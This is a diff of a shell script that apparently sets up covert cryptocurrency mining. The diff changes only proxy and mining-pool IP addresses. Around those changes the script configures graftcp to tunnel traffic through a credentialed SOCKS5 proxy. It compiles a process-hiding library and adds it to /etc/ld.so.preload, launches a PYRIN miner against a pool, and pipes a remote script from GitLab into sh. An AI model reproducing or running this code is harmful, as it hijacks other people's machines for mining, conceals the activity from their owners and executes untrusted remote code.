@@ -25,7 +25,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 159.65.189.192:443
+socks5 = 68.183.159.42:443
 socks5_username = majapahlevi
 socks5_password = majapahlevi
 END
@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 167.71.107.204:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
